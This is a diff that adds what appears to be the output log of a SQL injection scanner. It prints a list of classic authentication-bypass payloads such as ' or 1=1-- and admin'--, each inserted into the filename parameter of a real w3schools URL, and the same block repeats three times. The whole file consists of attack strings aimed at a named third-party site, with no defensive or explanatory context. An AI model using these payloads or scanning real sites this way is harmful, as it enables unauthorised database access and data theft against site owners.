@@ -1,0 +1,213 @@
+https://tryphp.w3schools.com/showphp.php?filename=demo_form_get
+[+]Sqli paylaod: '
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename='
+[+]Sqli paylaod: ' or '1=1
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=' or '1=1
+[+]Sqli paylaod: ' and '1'='1' #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=' and '1'='1' #
+[+]Sqli paylaod: ' and 1=1 #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=' and 1=1 #
+[+]Sqli paylaod: ' #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=' #
+[+]Sqli paylaod: ' and '1'='1
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=' and '1'='1
+[+]Sqli paylaod: 'or'1'='1
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename='or'1'='1
+[+]Sqli paylaod: '=' 'OR'
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename='=' 'OR'
+[+]Sqli paylaod: anything' OR 'x'='x
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=anything' OR 'x'='x
+[+]Sqli paylaod: admin’--
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=admin’--
+[+]Sqli paylaod: ’ or 0=0 --
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or 0=0 --
+[+]Sqli paylaod: ’ or ’ 1=1
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or ’ 1=1
+[+]Sqli paylaod: ’ or ’ 1
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or ’ 1
+[+]Sqli paylaod: ’ or ’
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or ’
+[+]Sqli paylaod: " or 0=0 --
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=" or 0=0 --
+[+]Sqli paylaod: or 0=0 --
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=or 0=0 --
+[+]Sqli paylaod: ’ or 0=0 #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or 0=0 #
+[+]Sqli paylaod: " or 0=0 #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=" or 0=0 #
+[+]Sqli paylaod: or 0=0 #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=or 0=0 #
+[+]Sqli paylaod: ’ or ’x’=’x
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or ’x’=’x
+[+]Sqli paylaod: " or "x"="x
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=" or "x"="x
+[+]Sqli paylaod: ’) or (’x’=’x
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’) or (’x’=’x
+[+]Sqli paylaod: ’ or 1=1--
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or 1=1--
+[+]Sqli paylaod: " or 1=1--
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=" or 1=1--
+[+]Sqli paylaod: or 1=1--
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=or 1=1--
+[+]Sqli paylaod: ’ or a=a--
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or a=a--
+[+]Sqli paylaod: " or "a"="a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=" or "a"="a
+[+]Sqli paylaod: ’) or (’a’=’a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’) or (’a’=’a
+[+]Sqli paylaod: ") or ("a"="a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=") or ("a"="a
+[+]Sqli paylaod: hi" or "a"="a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi" or "a"="a
+[+]Sqli paylaod: hi" or 1=1 --
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi" or 1=1 --
+[+]Sqli paylaod: hi’ or 1=1 --
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi’ or 1=1 --
+[+]Sqli paylaod: hi’ or ’a’=’a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi’ or ’a’=’a
+[+]Sqli paylaod: hi’) or (’a’=’a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi’) or (’a’=’a
+[+]Sqli paylaod: hi")or("a"="a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi")or("a"="a
+https://tryphp.w3schools.com/showphp.php?filename=demo_form_get
+[+]Sqli paylaod: '
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename='
+[+]Sqli paylaod: ' or '1=1
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=' or '1=1
+[+]Sqli paylaod: ' and '1'='1' #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=' and '1'='1' #
+[+]Sqli paylaod: ' and 1=1 #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=' and 1=1 #
+[+]Sqli paylaod: ' #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=' #
+[+]Sqli paylaod: ' and '1'='1
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=' and '1'='1
+[+]Sqli paylaod: 'or'1'='1
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename='or'1'='1
+[+]Sqli paylaod: '=' 'OR'
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename='=' 'OR'
+[+]Sqli paylaod: anything' OR 'x'='x
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=anything' OR 'x'='x
+[+]Sqli paylaod: admin’--
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=admin’--
+[+]Sqli paylaod: ’ or 0=0 --
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or 0=0 --
+[+]Sqli paylaod: ’ or ’ 1=1
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or ’ 1=1
+[+]Sqli paylaod: ’ or ’ 1
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or ’ 1
+[+]Sqli paylaod: ’ or ’
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or ’
+[+]Sqli paylaod: " or 0=0 --
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=" or 0=0 --
+[+]Sqli paylaod: or 0=0 --
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=or 0=0 --
+[+]Sqli paylaod: ’ or 0=0 #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or 0=0 #
+[+]Sqli paylaod: " or 0=0 #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=" or 0=0 #
+[+]Sqli paylaod: or 0=0 #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=or 0=0 #
+[+]Sqli paylaod: ’ or ’x’=’x
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or ’x’=’x
+[+]Sqli paylaod: " or "x"="x
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=" or "x"="x
+[+]Sqli paylaod: ’) or (’x’=’x
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’) or (’x’=’x
+[+]Sqli paylaod: ’ or 1=1--
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or 1=1--
+[+]Sqli paylaod: " or 1=1--
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=" or 1=1--
+[+]Sqli paylaod: or 1=1--
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=or 1=1--
+[+]Sqli paylaod: ’ or a=a--
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or a=a--
+[+]Sqli paylaod: " or "a"="a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=" or "a"="a
+[+]Sqli paylaod: ’) or (’a’=’a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’) or (’a’=’a
+[+]Sqli paylaod: ") or ("a"="a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=") or ("a"="a
+[+]Sqli paylaod: hi" or "a"="a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi" or "a"="a
+[+]Sqli paylaod: hi" or 1=1 --
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi" or 1=1 --
+[+]Sqli paylaod: hi’ or 1=1 --
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi’ or 1=1 --
+[+]Sqli paylaod: hi’ or ’a’=’a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi’ or ’a’=’a
+[+]Sqli paylaod: hi’) or (’a’=’a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi’) or (’a’=’a
+[+]Sqli paylaod: hi")or("a"="a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi")or("a"="a
+https://tryphp.w3schools.com/showphp.php?filename=demo_form_get
+[+]Sqli paylaod: '
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename='
+[+]Sqli paylaod: ' or '1=1
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=' or '1=1
+[+]Sqli paylaod: ' and '1'='1' #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=' and '1'='1' #
+[+]Sqli paylaod: ' and 1=1 #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=' and 1=1 #
+[+]Sqli paylaod: ' #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=' #
+[+]Sqli paylaod: ' and '1'='1
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=' and '1'='1
+[+]Sqli paylaod: 'or'1'='1
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename='or'1'='1
+[+]Sqli paylaod: '=' 'OR'
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename='=' 'OR'
+[+]Sqli paylaod: anything' OR 'x'='x
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=anything' OR 'x'='x
+[+]Sqli paylaod: admin’--
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=admin’--
+[+]Sqli paylaod: ’ or 0=0 --
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or 0=0 --
+[+]Sqli paylaod: ’ or ’ 1=1
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or ’ 1=1
+[+]Sqli paylaod: ’ or ’ 1
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or ’ 1
+[+]Sqli paylaod: ’ or ’
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or ’
+[+]Sqli paylaod: " or 0=0 --
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=" or 0=0 --
+[+]Sqli paylaod: or 0=0 --
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=or 0=0 --
+[+]Sqli paylaod: ’ or 0=0 #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or 0=0 #
+[+]Sqli paylaod: " or 0=0 #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=" or 0=0 #
+[+]Sqli paylaod: or 0=0 #
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=or 0=0 #
+[+]Sqli paylaod: ’ or ’x’=’x
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or ’x’=’x
+[+]Sqli paylaod: " or "x"="x
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=" or "x"="x
+[+]Sqli paylaod: ’) or (’x’=’x
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’) or (’x’=’x
+[+]Sqli paylaod: ’ or 1=1--
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or 1=1--
+[+]Sqli paylaod: " or 1=1--
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=" or 1=1--
+[+]Sqli paylaod: or 1=1--
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=or 1=1--
+[+]Sqli paylaod: ’ or a=a--
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’ or a=a--
+[+]Sqli paylaod: " or "a"="a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=" or "a"="a
+[+]Sqli paylaod: ’) or (’a’=’a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=’) or (’a’=’a
+[+]Sqli paylaod: ") or ("a"="a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=") or ("a"="a
+[+]Sqli paylaod: hi" or "a"="a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi" or "a"="a
+[+]Sqli paylaod: hi" or 1=1 --
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi" or 1=1 --
+[+]Sqli paylaod: hi’ or 1=1 --
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi’ or 1=1 --
+[+]Sqli paylaod: hi’ or ’a’=’a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi’ or ’a’=’a
+[+]Sqli paylaod: hi’) or (’a’=’a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi’) or (’a’=’a
+[+]Sqli paylaod: hi")or("a"="a
+[+]Sqli URL: https://tryphp.w3schools.com/showphp.php?filename=hi")or("a"="a
